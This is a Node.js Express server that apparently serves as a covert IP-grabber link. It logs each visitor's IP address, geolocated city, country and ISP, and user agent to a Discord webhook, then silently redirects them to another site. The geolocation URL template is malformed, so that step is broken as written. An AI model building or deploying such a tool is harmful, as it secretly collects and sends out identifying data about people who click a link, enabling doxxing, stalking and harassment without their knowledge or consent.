const express = require('express');
const app = express();

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol';

app.get('/', async (req, res) => {
    // 1. Extract the IP address safely
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    let clientIp = rawIp.split(',')[0].trim();

    if (clientIp.includes('::ffff:')) {
        clientIp = clientIp.replace('::ffff:', '');
    }
    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') {
        clientIp = '8.8.8.8'; 
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            // 2. FIXED: Uses HTTPS to prevent Render from blocking the connection
            const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`);
            const geoData = await geoResponse.json();

            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, 
                    description: "A user has accessed the tracking link.",
                    fields: [
                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                        // ipapi.co returns the ISP name inside the 'org' field
                        { name: "ISP Network", value: `\`${geoData.org || "Unknown"}\``, inline: true },
                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country_name || "Unknown"}\``, inline: false },
                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // 3. Send the formatted payload to Discord
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    }

    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
